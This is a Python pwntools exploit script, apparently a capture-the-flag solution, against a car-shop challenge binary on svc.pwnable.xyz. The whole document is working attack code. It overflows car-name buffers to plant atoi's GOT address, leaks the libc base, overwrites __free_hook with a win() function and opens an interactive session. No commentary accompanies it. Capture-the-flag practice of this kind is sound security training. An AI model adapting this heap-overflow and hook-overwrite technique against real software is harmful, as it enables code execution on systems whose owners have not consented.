from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
    atoi_offset = 0x36e90
    freehook_offset = 0x3c67a8
    binsh_offset = 0x18ce57
else:
    r = remote('svc.pwnable.xyz', 30037)
    atoi_offset = 0x34240
    freehook_offset = 0x3987c8
    binsh_offset = 0x15fdca

sla = r.sendlineafter

def buy(idx):
    sla('> ', '1')
    sla('> ', str(idx))

def sell(car):
    sla('> ', '2')
    sla('> ', car)

def remodel(old, new):
    sla('> ', '3')
    sla('Which car would you like to remodel: ', old)
    sla('Name your new model: ', new)

def list_cars():
    sla('> ', '4')

win = 0x400b4e # win()
atoi_got = 0x601ff0 # GOT address of atoi()


# libc leak

buy(0) # BMW
buy(1) # Lexus

remodel('BMW', 'a' * 0x28)
remodel('aa', b'a' * 0x20 + p64(atoi_got))

list_cars()

r.recvuntil('🚗: ')
r.recvuntil('🚗: ')

atoi = u64(r.recvline()[:-1].ljust(8, b'\x00')) # atoi()
libc = atoi - atoi_offset # libc base
log.info('libc base: ' + hex(libc))
freehook = libc + freehook_offset # __free_hook
binsh = libc + binsh_offset # "/bin/sh"


# free hook overwrite -> win()

remodel(b'a' * 0x20 + p64(atoi_got), 'a' * 0x28)
remodel('a' * 0x22, b'a' * 0x20 + p64(freehook))
remodel('\x00', p64(win))


r.interactive()